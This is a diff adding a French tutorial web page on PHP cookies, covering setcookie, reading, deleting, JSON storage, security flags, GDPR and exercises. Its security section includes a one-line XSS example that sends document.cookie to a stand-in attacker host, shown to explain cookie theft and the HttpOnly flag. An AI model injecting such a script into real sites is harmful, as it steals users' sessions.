@@ -1,0 +1,886 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Cookies en PHP</title>
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+    <link rel="stylesheet" href="style.css">
+    <style>
+        /* Styles pour les SVG */
+        .svg-container {
+            margin: 20px auto;
+            text-align: center;
+        }
+        .cookie-path {
+            animation: dashAnimation 3s linear infinite;
+        }
+        @keyframes dashAnimation {
+            to {
+                stroke-dashoffset: 0;
+            }
+        }
+    </style>
+</head>
+<body>
+    <header class="bg-primary text-white py-5">
+        <div class="container text-center">
+            <img src="images/php_logo.svg" alt="PHP Logo" class="mb-3" style="height: 100px;">
+            <h1 class="display-4">Cookies en PHP</h1>
+            <p class="lead">Comprendre et utiliser les cookies en PHP</p>
+        </div>
+    </header>
+
+    <div class="container mt-5">
+        <div class="row">
+            <div class="col-md-3">
+                <div class="list-group">
+                    <a href="#introduction" class="list-group-item list-group-item-action">Introduction</a>
+                    <a href="#fonctionnement" class="list-group-item list-group-item-action">Fonctionnement des cookies</a>
+                    <a href="#exemples" class="list-group-item list-group-item-action">Exemples pratiques</a>
+                    <a href="#securite" class="list-group-item list-group-item-action">Sécurité</a>
+                    <a href="#exercices" class="list-group-item list-group-item-action">Exercices pratiques</a>
+                </div>
+            </div>
+
+            <div class="col-md-9">
+                <section id="introduction" class="mb-5">
+                    <h2>Introduction aux cookies</h2>
+                    <p class="mb-3">Les cookies sont de petits fichiers texte stockés sur l'ordinateur du client par le navigateur web. Ils jouent un rôle fondamental dans l'expérience web moderne en permettant aux sites de "se souvenir" des informations entre différentes visites.</p>
+                    
+                    <h4>À quoi servent les cookies ?</h4>
+                    <p>Les cookies permettent de :</p>
+                    <ul>
+                        <li><strong>Maintenir l'état d'une session utilisateur</strong> - Par exemple, rester connecté à un site même après avoir fermé l'onglet</li>
+                        <li><strong>Stocker des préférences utilisateur</strong> - Comme la langue, le thème, ou d'autres paramètres personnalisés</li>
+                        <li><strong>Suivre le comportement des utilisateurs</strong> - Permettant l'analyse des interactions (analytics) et la personnalisation de contenu</li>
+                        <li><strong>Mémoriser le contenu d'un panier</strong> - Pour les sites e-commerce, conserver les articles sélectionnés pendant la navigation</li>
+                    </ul>
+                    
+                    <div class="alert alert-secondary">
+                        <h5>Comment fonctionnent-ils concrètement ?</h5>
+                        <p>Imaginez que vous entrez dans un magasin où l'on vous remet un petit ticket avec un numéro. À chaque fois que vous revenez dans ce magasin, vous montrez ce ticket, et le vendeur peut se rappeler de vos préférences et de vos achats précédents. Les cookies fonctionnent de façon similaire sur internet.</p>
+                    </div>
+                    
+                    <div class="svg-container">
+                        <svg width="400" height="200" viewBox="0 0 400 200">
+                            <!-- Cookie Icon -->
+                            <circle cx="200" cy="100" r="70" fill="#f5d742" />
+                            <circle cx="170" cy="70" r="10" fill="#8b4513" />
+                            <circle cx="230" cy="80" r="10" fill="#8b4513" />
+                            <circle cx="190" cy="130" r="10" fill="#8b4513" />
+                            <circle cx="220" cy="110" r="8" fill="#8b4513" />
+                            <circle cx="180" cy="90" r="8" fill="#8b4513" />
+                            <text x="200" y="190" text-anchor="middle" font-size="16" fill="#333">Cookies: Petits fichiers stockés côté client</text>
+                        </svg>
+                    </div>
+                    
+                    <div class="alert alert-info mt-4">
+                        <h5>Différence avec les sessions :</h5>
+                        <p><strong>Cookies :</strong> Stockés côté client (dans le navigateur de l'utilisateur). Les données restent sur l'ordinateur de l'utilisateur.</p>
+                        <p><strong>Sessions :</strong> Stockées côté serveur. Seul un identifiant de session est envoyé au client via un cookie, mais les données elles-mêmes restent sur le serveur.</p>
+                        <p class="mb-0"><strong>En résumé :</strong> Les cookies sont comme un bracelet que vous portez avec vos informations écrites dessus. Les sessions sont comme un bracelet avec seulement un numéro, et le magasin conserve vos informations dans son système.</p>
+                    </div>
+                    
+                    <h4 class="mt-4">Types de cookies</h4>
+                    <table class="table table-bordered">
+                        <thead class="table-light">
+                            <tr>
+                                <th>Type</th>
+                                <th>Description</th>
+                                <th>Durée de vie</th>
+                            </tr>
+                        </thead>
+                        <tbody>
+                            <tr>
+                                <td>Cookies de session</td>
+                                <td>Existent uniquement pendant la durée de la session du navigateur</td>
+                                <td>Jusqu'à la fermeture du navigateur</td>
+                            </tr>
+                            <tr>
+                                <td>Cookies persistants</td>
+                                <td>Restent stockés entre les sessions</td>
+                                <td>Jusqu'à leur date d'expiration ou suppression manuelle</td>
+                            </tr>
+                            <tr>
+                                <td>Cookies propriétaires</td>
+                                <td>Créés par le site que l'utilisateur visite</td>
+                                <td>Variable</td>
+                            </tr>
+                            <tr>
+                                <td>Cookies tiers</td>
+                                <td>Créés par des domaines autres que celui visité</td>
+                                <td>Variable</td>
+                            </tr>
+                        </tbody>
+                    </table>
+                </section>
+
+                <section id="fonctionnement" class="mb-5">
+                    <h2>Fonctionnement des cookies</h2>
+                    
+                    <div class="alert alert-primary">
+                        <h5>Le principe fondamental</h5>
+                        <p class="mb-0">Les cookies fonctionnent sur un principe simple d'échange : le serveur <strong>demande</strong> au navigateur de stocker une information, et le navigateur la <strong>renvoie</strong> automatiquement lors des requêtes suivantes.</p>
+                    </div>
+                    
+                    <h4 class="mt-4">Cycle de vie d'un cookie</h4>
+                    <p>Le processus complet fonctionne ainsi :</p>
+                    <ol>
+                        <li><strong>Création :</strong> Le serveur PHP envoie un cookie via l'en-tête HTTP <code>Set-Cookie</code> (à l'aide de la fonction <code>setcookie()</code>)</li>
+                        <li><strong>Stockage :</strong> Le navigateur reçoit cette instruction et stocke le cookie dans un emplacement sécurisé sur l'ordinateur de l'utilisateur</li>
+                        <li><strong>Transmission automatique :</strong> Pour chaque requête suivante au même domaine, le navigateur renvoie <em>automatiquement</em> le cookie au serveur</li>
+                        <li><strong>Lecture :</strong> Le serveur PHP peut lire la valeur du cookie via la variable superglobale <code>$_COOKIE</code></li>
+                        <li><strong>Expiration :</strong> Le cookie est supprimé lorsque sa date d'expiration est atteinte ou que l'utilisateur efface ses cookies</li>
+                    </ol>
+                    
+                    <div class="svg-container">
+                        <svg width="600" height="300" viewBox="0 0 600 300">
+                            <!-- Client -->
+                            <rect x="50" y="100" width="150" height="100" rx="10" fill="#6c757d" />
+                            <text x="125" y="150" text-anchor="middle" font-size="16" fill="white">Navigateur</text>
+                            
+                            <!-- Server -->
+                            <rect x="400" y="100" width="150" height="100" rx="10" fill="#0d6efd" />
+                            <text x="475" y="150" text-anchor="middle" font-size="16" fill="white">Serveur PHP</text>
+                            
+                            <!-- Arrow 1: Request -->
+                            <line x1="200" y1="130" x2="400" y2="130" stroke="#333" stroke-width="2" marker-end="url(#arrowhead)" />
+                            <text x="300" y="120" text-anchor="middle" font-size="14" fill="#333">1. Requête HTTP</text>
+                            
+                            <!-- Arrow 2: Response with Cookie -->
+                            <line x1="400" y1="170" x2="200" y2="170" stroke="#28a745" stroke-width="2" marker-end="url(#arrowhead2)" />
+                            <text x="300" y="190" text-anchor="middle" font-size="14" fill="#28a745">2. Réponse avec Set-Cookie</text>
+                            
+                            <!-- Arrow 3: Request with Cookie -->
+                            <path class="cookie-path" d="M200,210 C300,250 300,250 400,210" fill="none" stroke="#dc3545" stroke-width="2" stroke-dasharray="5,5" marker-end="url(#arrowhead3)" />
+                            <text x="300" y="250" text-anchor="middle" font-size="14" fill="#dc3545">3. Requêtes suivantes avec Cookie</text>
+                            
+                            <!-- Arrowhead markers -->
+                            <defs>
+                                <marker id="arrowhead" markerWidth="10" markerHeight="7" refX="9" refY="3.5" orient="auto">
+                                    <polygon points="0 0, 10 3.5, 0 7" fill="#333" />
+                                </marker>
+                                <marker id="arrowhead2" markerWidth="10" markerHeight="7" refX="9" refY="3.5" orient="auto">
+                                    <polygon points="0 0, 10 3.5, 0 7" fill="#28a745" />
+                                </marker>
+                                <marker id="arrowhead3" markerWidth="10" markerHeight="7" refX="9" refY="3.5" orient="auto">
+                                    <polygon points="0 0, 10 3.5, 0 7" fill="#dc3545" />
+                                </marker>
+                            </defs>
+                        </svg>
+                    </div>
+                    
+                    <div class="alert alert-secondary mt-4">
+                        <h5>Où sont stockés les cookies ?</h5>
+                        <p class="mb-0">Les cookies sont stockés dans des fichiers spéciaux sur votre ordinateur. L'emplacement exact dépend du navigateur. Par exemple, dans Chrome, ils sont stockés dans une base de données SQLite dans le dossier du profil utilisateur.</p>
+                    </div>
+                    
+                    <h4 class="mt-4">Paramètres importants d'un cookie</h4>
+                    <p>Lorsque vous créez un cookie avec PHP, vous pouvez configurer plusieurs options qui déterminent son comportement :</p>
+                    
+                    <table class="table table-striped">
+                        <thead class="table-primary">
+                            <tr><th>Paramètre</th><th>Description</th><th>Exemple</th></tr>
+                        </thead>
+                        <tbody>
+                            <tr>
+                                <td><strong>Nom/Valeur</strong></td>
+                                <td>L'identifiant du cookie et sa valeur associée</td>
+                                <td><code>'nom_cookie' => 'valeur'</code></td>
+                            </tr>
+                            <tr>
+                                <td><strong>Expiration</strong></td>
+                                <td>Date et heure d'expiration en timestamp UNIX</td>
+                                <td><code>time() + (86400 * 30)</code> (30 jours)</td>
+                            </tr>
+                            <tr>
+                                <td><strong>Path</strong></td>
+                                <td>Chemin sur le serveur où le cookie sera disponible</td>
+                                <td><code>'/'</code> (tout le site) ou <code>'/admin/'</code> (section admin)</td>
+                            </tr>
+                            <tr>
+                                <td><strong>Domain</strong></td>
+                                <td>Domaine pour lequel le cookie est valide</td>
+                                <td><code>'.example.com'</code> (y compris sous-domaines)</td>
+                            </tr>
+                            <tr>
+                                <td><strong>Secure</strong></td>
+                                <td>Cookie envoyé uniquement en HTTPS</td>
+                                <td><code>true</code> ou <code>false</code></td>
+                            </tr>
+                            <tr>
+                                <td><strong>HttpOnly</strong></td>
+                                <td>Cookie inaccessible via JavaScript</td>
+                                <td><code>true</code> ou <code>false</code></td>
+                            </tr>
+                            <tr>
+                                <td><strong>SameSite</strong></td>
+                                <td>Contrôle quand le cookie est envoyé dans requêtes cross-site</td>
+                                <td><code>'Strict'</code>, <code>'Lax'</code>, ou <code>'None'</code></td>
+                            </tr>
+                        </tbody>
+                    </table>
+                    
+                    <div class="svg-container">
+                        <svg width="600" height="250" viewBox="0 0 600 250">
+                            <!-- Cookie anatomy -->
+                            <rect x="100" y="50" width="400" height="150" rx="10" fill="#f8f9fa" stroke="#333" stroke-width="2"/>
+                            <text x="300" y="40" text-anchor="middle" font-size="18" font-weight="bold" fill="#333">Anatomie d'un Cookie</text>
+                            
+                            <!-- Name-Value -->
+                            <rect x="120" y="70" width="180" height="30" rx="5" fill="#0dcaf0" />
+                            <text x="210" y="90" text-anchor="middle" font-size="14" fill="white">Nom=Valeur</text>
+                            
+                            <!-- Expires -->
+                            <rect x="320" y="70" width="160" height="30" rx="5" fill="#6f42c1" />
+                            <text x="400" y="90" text-anchor="middle" font-size="14" fill="white">Expires=Date</text>
+                            
+                            <!-- Path -->
+                            <rect x="120" y="120" width="120" height="30" rx="5" fill="#fd7e14" />
+                            <text x="180" y="140" text-anchor="middle" font-size="14" fill="white">Path=/</text>
+                            
+                            <!-- Secure Flag -->
+                            <rect x="260" y="120" width="100" height="30" rx="5" fill="#20c997" />
+                            <text x="310" y="140" text-anchor="middle" font-size="14" fill="white">Secure</text>
+                            
+                            <!-- HTTPOnly Flag -->
+                            <rect x="380" y="120" width="100" height="30" rx="5" fill="#e83e8c" />
+                            <text x="430" y="140" text-anchor="middle" font-size="14" fill="white">HttpOnly</text>
+                            
+                            <!-- SameSite -->
+                            <rect x="160" y="170" width="280" height="20" rx="5" fill="#6c757d" />
+                            <text x="300" y="185" text-anchor="middle" font-size="12" fill="white">SameSite=Strict|Lax|None</text>
+                        </svg>
+                    </div>
+                    
+                    <div class="card mt-4 mb-4">
+                        <div class="card-header bg-light">
+                            <h5 class="mb-0">Important à savoir</h5>
+                        </div>
+                        <div class="card-body">
+                            <ul class="mb-0">
+                                <li><strong>Taille limite</strong> : Un cookie est limité à environ 4Ko (4096 octets). Ne stockez pas de grandes quantités de données.</li>
+                                <li><strong>Nombre limite</strong> : Un navigateur peut limiter le nombre de cookies par domaine (généralement 50).</li>
+                                <li><strong>Priorité</strong> : La fonction <code>setcookie()</code> doit être appelée <em>avant</em> tout affichage HTML ou espace.</li>
+                                <li><strong>Modifications</strong> : Pour modifier un cookie, réutilisez <code>setcookie()</code> avec le même nom.</li>
+                                <li><strong>Disponibilité</strong> : Un cookie créé n'est disponible dans <code>$_COOKIE</code> qu'à la prochaine requête HTTP.</li>
+                            </ul>
+                        </div>
+                    </div>
+                </section>
+
+                <section id="exemples" class="mb-5">
+                    <h2>Exemples pratiques</h2>
+                    
+                    <div class="alert alert-info mb-4">
+                        <h5>Comment utiliser les exemples</h5>
+                        <p class="mb-0">Les exemples suivants sont conçus pour être copiés et testés. Prenez le temps de comprendre chaque ligne avant de passer à l'exemple suivant. N'hésitez pas à modifier les valeurs pour voir leur impact.</p>
+                    </div>
+                    
+                    <div class="card mb-4">
+                        <div class="card-header bg-primary text-white">
+                            <h4 class="mb-0">1. Création d'un cookie simple</h4>
+                        </div>
+                        <div class="card-body">
+                            <h5>Objectif :</h5>
+                            <p>Créer un cookie nommé 'utilisateur' qui stocke un nom d'utilisateur pendant 30 jours.</p>
+                            
+                            <h5>Code :</h5>
+                            <pre><code class="language-php">&lt;?php
+// Créer un cookie valide 30 jours
+setcookie('utilisateur', 'JeanDupont', time() + (86400 * 30), "/");
+
+// Explication ligne par ligne :
+// 1. setcookie() - Fonction PHP qui définit un cookie
+// 2. 'utilisateur' - Le nom du cookie (utilisé pour le récupérer plus tard)
+// 3. 'JeanDupont' - La valeur stockée dans le cookie
+// 4. time() + (86400 * 30) - Date d'expiration (timestamp actuel + 30 jours en secondes)
+// 5. "/" - Path du cookie (disponible sur tout le site)
+?&gt;</code></pre>
+                            
+                            <div class="alert alert-warning mt-3">
+                                <h6>Points importants :</h6>
+                                <ul class="mb-0">
+                                    <li>La fonction <code>setcookie()</code> doit être appelée <strong>avant</strong> tout affichage HTML</li>
+                                    <li>Le timestamp est en secondes : <code>86400 = 60 * 60 * 24</code> (secondes dans une journée)</li>
+                                    <li>Le cookie ne sera disponible qu'à la prochaine requête HTTP</li>
+                                </ul>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <div class="card mb-4">
+                        <div class="card-header bg-success text-white">
+                            <h4 class="mb-0">2. Lire un cookie</h4>
+                        </div>
+                        <div class="card-body">
+                            <h5>Objectif :</h5>
+                            <p>Vérifier si un cookie existe et afficher sa valeur de façon sécurisée.</p>
+                            
+                            <h5>Code :</h5>
+                            <pre><code class="language-php">&lt;?php
+// Vérifier si le cookie 'utilisateur' existe
+if(isset($_COOKIE['utilisateur'])) {
+    // Afficher un message de bienvenue avec le nom d'utilisateur
+    // htmlspecialchars() protège contre les attaques XSS
+    echo "Bonjour " . htmlspecialchars($_COOKIE['utilisateur']);
+} else {
+    // Message si aucun cookie n'est trouvé
+    echo "Aucun cookie utilisateur trouvé";
+}
+
+// Explication :
+// 1. isset($_COOKIE['utilisateur']) - Vérifie si le cookie 'utilisateur' existe
+// 2. $_COOKIE - Variable superglobale qui contient tous les cookies envoyés par le client
+// 3. htmlspecialchars() - Convertit les caractères spéciaux en entités HTML (sécurité)
+?&gt;</code></pre>
+                            
+                            <div class="alert alert-info mt-3">
+                                <h6>Astuce pour le débogage :</h6>
+                                <p class="mb-0">Vous pouvez utiliser <code>print_r($_COOKIE);</code> pour voir tous les cookies disponibles.</p>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <div class="card mb-4">
+                        <div class="card-header bg-danger text-white">
+                            <h4 class="mb-0">3. Supprimer un cookie</h4>
+                        </div>
+                        <div class="card-body">
+                            <h5>Objectif :</h5>
+                            <p>Effacer un cookie existant du navigateur de l'utilisateur.</p>
+                            
+                            <h5>Code :</h5>
+                            <pre><code class="language-php">&lt;?php
+// Pour supprimer un cookie, on définit une date d'expiration passée
+setcookie('utilisateur', '', time() - 3600, "/");
+
+// Explication :
+// 1. Même nom de cookie que celui qu'on veut supprimer ('utilisateur')
+// 2. Valeur vide ('') - Effacement de la valeur
+// 3. time() - 3600 - Date d'expiration dans le passé (il y a une heure)
+// 4. "/" - Même chemin que lors de la création (important!)
+
+// Note : La suppression ne sera effective qu'à la prochaine requête
+// $_COOKIE['utilisateur'] existe toujours pendant l'exécution du script actuel
+unset($_COOKIE['utilisateur']); // Pour supprimer également de la superglobale
+?&gt;</code></pre>
+                            
+                            <div class="alert alert-warning mt-3">
+                                <h6>Important :</h6>
+                                <ul class="mb-0">
+                                    <li>Vous devez spécifier <strong>exactement les mêmes paramètres</strong> que lors de la création (path, domain)</li>
+                                    <li>Le navigateur ne supprime pas immédiatement le cookie, il attend la prochaine requête</li>
+                                    <li><code>unset($_COOKIE['nom'])</code> supprime le cookie de la variable, mais pas du navigateur</li>
+                                </ul>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <div class="card mb-4">
+                        <div class="card-header bg-info text-white">
+                            <h4 class="mb-0">4. Stocker un tableau dans un cookie</h4>
+                        </div>
+                        <div class="card-body">
+                            <h5>Objectif :</h5>
+                            <p>Stocker des données complexes (comme un tableau) dans un cookie.</p>
+                            
+                            <h5>Code :</h5>
+                            <pre><code class="language-php">&lt;?php
+// Créer un tableau de données
+$preferences = [
+    'theme' => 'sombre',
+    'langue' => 'fr',
+    'notifications' => true
+];
+
+// Encoder le tableau en JSON pour le stocker dans un cookie
+setcookie('preferences', json_encode($preferences), time() + (86400 * 30), "/");
+
+// Plus tard, pour récupérer les données :
+if(isset($_COOKIE['preferences'])) {
+    // Décoder le JSON en tableau PHP
+    $preferences = json_decode($_COOKIE['preferences'], true);
+    
+    // Utiliser les valeurs
+    echo "Thème : " . htmlspecialchars($preferences['theme']) . "<br>";
+    echo "Langue : " . htmlspecialchars($preferences['langue']) . "<br>";
+    echo "Notifications : " . ($preferences['notifications'] ? 'Activées' : 'Désactivées');
+}
+
+// Explication :
+// 1. json_encode() - Convertit un tableau PHP en chaîne JSON
+// 2. json_decode() - Convertit une chaîne JSON en tableau PHP
+// 3. Second paramètre 'true' - Crée un tableau associatif plutôt qu'un objet
+?&gt;</code></pre>
+                            
+                            <div class="alert alert-info mt-3">
+                                <h6>Astuce :</h6>
+                                <p class="mb-0">Cette technique est très utile pour les paniers d'achat, les préférences utilisateur, et d'autres données structurées.</p>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <div class="mt-4">
+                        <h4>Cas pratique : Se souvenir de la visite d'un utilisateur</h4>
+                        <p>Voici un exemple complet qui affiche un message différent selon que l'utilisateur visite le site pour la première fois ou revient :</p>
+                        
+                        <pre><code class="language-php">&lt;?php
+// Vérifier si l'utilisateur a déjà visité le site
+if(!isset($_COOKIE['visite'])) {
+    // Première visite - créer le cookie
+    setcookie('visite', '1', time() + (86400 * 365), "/"); // Valide un an
+    $message = "Bienvenue sur notre site ! C'est votre première visite.";
+    $count = 1;
+} else {
+    // Visite répétée - incrémenter le compteur
+    $count = intval($_COOKIE['visite']) + 1;
+    setcookie('visite', $count, time() + (86400 * 365), "/");
+    $message = "Ravi de vous revoir ! C'est votre visite numéro $count.";
+}
+?&gt;
+
+&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;head&gt;
+    &lt;title&gt;Exemple de Compteur de Visites&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;h1&gt;&lt;?php echo $message; ?&gt;&lt;/h1&gt;
+&lt;/body&gt;
+&lt;/html&gt;</code></pre>
+                    </div>
+                </section>
+
+                <section id="securite" class="mb-5">
+                    <h2>Sécurité des cookies</h2>
+                    
+                    <div class="alert alert-danger">
+                        <h5>Pourquoi la sécurité est-elle cruciale ?</h5>
+                        <p class="mb-0">Les cookies peuvent contenir des données sensibles ou être utilisés pour des attaques. Il est essentiel de les sécuriser correctement pour protéger vos utilisateurs et votre application.</p>
+                    </div>
+                    
+                    <h4 class="mt-4">Principales menaces de sécurité</h4>
+                    
+                    <div class="card mb-4">
+                        <div class="card-header bg-warning">
+                            <h5 class="mb-0">1. Vol de cookies (Cookie theft)</h5>
+                        </div>
+                        <div class="card-body">
+                            <p><strong>Problème :</strong> Un attaquant peut voler les cookies d'un utilisateur via des attaques XSS (Cross-Site Scripting) et usurper son identité.</p>
+                            <p><strong>Solution :</strong> Utiliser le flag <code>HttpOnly</code> pour empêcher JavaScript d'accéder aux cookies.</p>
+                            
+                            <h6>Exemple d'attaque XSS :</h6>
+                            <pre><code class="language-javascript">&lt;script&gt;
+// Ce code malveillant pourrait être injecté dans votre site
+fetch('https://site-pirate.com/steal?cookie=' + document.cookie);
+&lt;/script&gt;</code></pre>
+                        </div>
+                    </div>
+                    
+                    <div class="card mb-4">
+                        <div class="card-header bg-warning">
+                            <h5 class="mb-0">2. Interception (Man-in-the-Middle)</h5>
+                        </div>
+                        <div class="card-body">
+                            <p><strong>Problème :</strong> Les cookies peuvent être interceptés lors de leur transmission si le site n'utilise pas HTTPS.</p>
+                            <p><strong>Solution :</strong> Utiliser le flag <code>Secure</code> pour que les cookies ne soient transmis qu'en HTTPS.</p>
+                        </div>
+                    </div>
+                    
+                    <div class="card mb-4">
+                        <div class="card-header bg-warning">
+                            <h5 class="mb-0">3. CSRF (Cross-Site Request Forgery)</h5>
+                        </div>
+                        <div class="card-body">
+                            <p><strong>Problème :</strong> Un site malveillant peut forcer votre navigateur à effectuer des requêtes vers un site où vous êtes authentifié.</p>
+                            <p><strong>Solution :</strong> Utiliser le flag <code>SameSite</code> pour limiter les requêtes cross-origin avec cookies.</p>
+                        </div>
+                    </div>
+                    
+                    <div class="alert alert-warning mt-4">
+                        <h4>Bonnes pratiques de sécurité :</h4>
+                        <ul>
+                            <li><strong>HttpOnly</strong> - Toujours utiliser ce flag pour empêcher l'accès via JavaScript</li>
+                            <li><strong>Secure</strong> - Utiliser ce flag en production pour imposer HTTPS</li>
+                            <li><strong>SameSite</strong> - Définir à "Strict" ou "Lax" pour se protéger contre CSRF</li>
+                            <li><strong>Données sensibles</strong> - Ne jamais stocker d'informations sensibles (mots de passe, données personnelles)</li>
+                            <li><strong>Validation</strong> - Toujours valider et filtrer les données des cookies avant utilisation</li>
+                            <li><strong>Expiration</strong> - Définir des dates d'expiration appropriées pour limiter les risques</li>
+                            <li><strong>Chiffrement</strong> - Pour les données importantes, envisager de les chiffrer avant stockage</li>
+                        </ul>
+                    </div>
+                    
+                    <div class="svg-container">
+                        <svg width="600" height="300" viewBox="0 0 600 300">
+                            <!-- Secure vs Insecure Cookies -->
+                            <rect x="50" y="50" width="200" height="200" rx="10" fill="#f8d7da" stroke="#dc3545" stroke-width="2"/>
+                            <text x="150" y="40" text-anchor="middle" font-size="16" font-weight="bold" fill="#dc3545">Cookie non sécurisé</text>
+                            
+                            <rect x="350" y="50" width="200" height="200" rx="10" fill="#d1e7dd" stroke="#198754" stroke-width="2"/>
+                            <text x="450" y="40" text-anchor="middle" font-size="16" font-weight="bold" fill="#198754">Cookie sécurisé</text>
+                            
+                            <!-- Insecure content -->
+                            <text x="150" y="80" text-anchor="middle" font-size="14" fill="#333">Données en texte clair</text>
+                            <text x="150" y="110" text-anchor="middle" font-size="14" fill="#333">Pas de flag HttpOnly</text>
+                            <text x="150" y="140" text-anchor="middle" font-size="14" fill="#333">Accessible depuis JavaScript</text>
+                            <text x="150" y="170" text-anchor="middle" font-size="14" fill="#333">Pas de flag Secure</text>
+                            <text x="150" y="200" text-anchor="middle" font-size="14" fill="#333">Pas de SameSite</text>
+                            
+                            <!-- Lock icon for insecure -->
+                            <circle cx="150" cy="230" r="15" fill="#dc3545" />
+                            <rect x="145" y="220" width="10" height="15" rx="2" fill="#f8d7da" />
+                            <rect x="147" y="228" width="6" height="3" rx="1" fill="#f8d7da" />
+                            
+                            <!-- Secure content -->
+                            <text x="450" y="80" text-anchor="middle" font-size="14" fill="#333">Données chiffrées</text>
+                            <text x="450" y="110" text-anchor="middle" font-size="14" fill="#333">Flag HttpOnly activé</text>
+                            <text x="450" y="140" text-anchor="middle" font-size="14" fill="#333">Non accessible par JavaScript</text>
+                            <text x="450" y="170" text-anchor="middle" font-size="14" fill="#333">Flag Secure activé</text>
+                            <text x="450" y="200" text-anchor="middle" font-size="14" fill="#333">SameSite=Strict</text>
+                            
+                            <!-- Lock icon for secure -->
+                            <circle cx="450" cy="230" r="15" fill="#198754" />
+                            <rect x="445" y="220" width="10" height="15" rx="2" fill="#d1e7dd" />
+                            <rect x="447" y="228" width="6" height="3" rx="1" fill="#d1e7dd" />
+                            
+                            <!-- Attack vector -->
+                            <path d="M190,130 C220,130 220,130 250,130" fill="none" stroke="#dc3545" stroke-width="2" stroke-dasharray="5,5" />
+                            <text x="275" y="120" text-anchor="middle" font-size="12" fill="#dc3545">XSS Attack</text>
+                            <text x="275" y="138" text-anchor="middle" font-size="12" fill="#dc3545">possible!</text>
+                            <polygon points="255,130 250,128 250,132" fill="#dc3545" />
+                        </svg>
+                    </div>
+                    
+                    <h4 class="mt-4">Exemple de cookie sécurisé en PHP 7+ :</h4>
+                    <pre><code class="language-php">&lt;?php
+// Création d'un cookie sécurisé avec un format tableau d'options (PHP 7.3+)
+setcookie(
+    'session_id',                    // Nom du cookie
+    bin2hex(random_bytes(16)),       // Valeur aléatoire sécurisée (32 caractères hex)
+    [
+        'expires' => time() + 86400, // Expiration après 1 jour
+        'path' => '/',               // Valide pour tout le site
+        'domain' => '',              // Domaine actuel uniquement
+        'secure' => true,            // Uniquement en HTTPS
+        'httponly' => true,          // Inaccessible par JavaScript
+        'samesite' => 'Strict'       // Protection contre CSRF
+    ]
+);
+
+// Pour PHP 5.6 à 7.2 (ancienne syntaxe) :
+/*
+setcookie('session_id', bin2hex(random_bytes(16)), time() + 86400, 
+          '/', '', true, true);
+// Note : SameSite n'est pas disponible dans l'ancienne syntaxe
+*/
+?&gt;</code></pre>
+                    
+                    <div class="card mt-4">
+                        <div class="card-header bg-primary text-white">
+                            <h5 class="mb-0">RGPD et ePrivacy : Considérations légales</h5>
+                        </div>
+                        <div class="card-body">
+                            <p>En Europe, les lois RGPD et ePrivacy exigent le consentement des utilisateurs pour les cookies non essentiels :</p>
+                            <ol>
+                                <li><strong>Informer les utilisateurs</strong> - Expliquer quels cookies sont utilisés et pourquoi</li>
+                                <li><strong>Obtenir le consentement</strong> - Avant de définir des cookies non essentiels</li>
+                                <li><strong>Permettre le refus</strong> - Offrir une option pour refuser les cookies</li>
+                                <li><strong>Proposer des paramètres</strong> - Permettre de personnaliser les préférences</li>
+                            </ol>
+                            <p class="mb-0">Vous devez implémenter une bannière de cookies conforme pour respecter ces réglementations.</p>
+                        </div>
+                    </div>
+                </section>
+                
+                <section id="exercices" class="mb-5">
+                    <h2>Exercices pratiques</h2>
+                    
+                    <div class="alert alert-primary mb-4">
+                        <h5>Comment tirer le maximum de ces exercices</h5>
+                        <p class="mb-0">Essayez d'abord de résoudre chaque exercice par vous-même avant de consulter la solution. L'apprentissage se fait par la pratique et les erreurs. N'hésitez pas à expérimenter en modifiant le code proposé pour approfondir votre compréhension.</p>
+                    </div>
+                    
+                    <div class="card mb-3">
+                        <div class="card-header bg-primary text-white">Exercice 1 : Cookie de préférence</div>
+                        <div class="card-body">
+                            <h5>Objectif pédagogique :</h5>
+                            <p>Apprendre à stocker et récupérer les préférences utilisateur avec les cookies.</p>
+                            
+                            <h5>Instructions :</h5>
+                            <p>Créez un script qui :</p>
+                            <ol>
+                                <li>Stocke la langue préférée de l'utilisateur (fr/en)</li>
+                                <li>Affiche un message de bienvenue dans la langue stockée</li>
+                                <li>Permet de changer la langue via un formulaire</li>
+                            </ol>
+                            
+                            <h5>Aide au développement :</h5>
+                            <ul>
+                                <li>Utilisez un formulaire avec une méthode POST</li>
+                                <li>Vérifiez si le formulaire a été soumis avec <code>$_SERVER['REQUEST_METHOD']</code></li>
+                                <li>Stockez la langue dans un cookie valide au moins 30 jours</li>
+                                <li>Préparez des messages dans différentes langues (tableau)</li>
+                                <li>Utilisez la valeur du cookie ou une valeur par défaut</li>
+                            </ul>
+                            
+                            <div class="mt-3">
+                                <a href="exercice1.php" class="btn btn-success mt-2" target="_blank">Voir la solution</a>
+                                <button class="btn btn-outline-primary ms-2" type="button" data-bs-toggle="collapse" data-bs-target="#solution1">
+                                    Afficher le code de la solution
+                                </button>
+                            </div>
+                            
+                            <div class="collapse mt-3" id="solution1">
+                                <div class="card card-body bg-light">
+                                    <h6>Solution proposée :</h6>
+                                    <pre><code class="language-php">&lt;?php
+// Vérifie si le formulaire a été soumis
+if($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['langue'])) {
+    // Stocke la langue dans un cookie (30 jours)
+    setcookie('langue', $_POST['langue'], time() + (86400 * 30), "/");
+    header('Location: '.$_SERVER['PHP_SELF']);
+    exit;
+}
+
+// Messages dans différentes langues
+$messages = [
+    'fr' => 'Bienvenue sur notre site!',
+    'en' => 'Welcome to our website!'
+];
+
+// Détermine la langue actuelle
+$langue = $_COOKIE['langue'] ?? 'fr';
+?&gt;
+&lt;!DOCTYPE html&gt;
+&lt;html lang="&lt;?= $langue === 'en' ? 'en' : 'fr' ?&gt;"&gt;
+&lt;head&gt;
+    &lt;meta charset="UTF-8"&gt;
+    &lt;title&gt;Exercice Préférence Langue&lt;/title&gt;
+    &lt;link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet"&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;div class="container mt-5"&gt;
